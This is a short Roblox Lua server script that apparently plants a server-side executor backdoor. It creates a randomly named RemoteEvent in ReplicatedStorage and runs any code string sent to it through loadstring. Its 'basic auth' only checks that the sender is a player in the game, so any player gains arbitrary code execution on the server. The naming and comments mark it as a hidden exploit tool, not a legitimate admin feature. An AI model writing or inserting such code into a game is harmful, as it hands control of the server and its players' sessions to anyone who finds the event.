local event = Instance.new("RemoteEvent")
event.Name = "Strawberry_SS_EXEC_"..math.random(1000, 9999)
event.Parent = game:GetService("ReplicatedStorage")
event.OnServerEvent:Connect(function(player, code)
if not player or not code or type(code) ~= "string" then return end
		-- basic auth, fuck off skids
if game:GetService("Players"):GetPlayerByUserId(player.UserId) then
    local success, err = pcall(function()
        local f = loadstring(code)
        local env = getfenv(f)
        env.player = player
        setfenv(f, env)
        f()
    end)
    
    if not success then
        warn("Strawberry SS EXEC Error: " .. tostring(err))
    end
		end
		end)
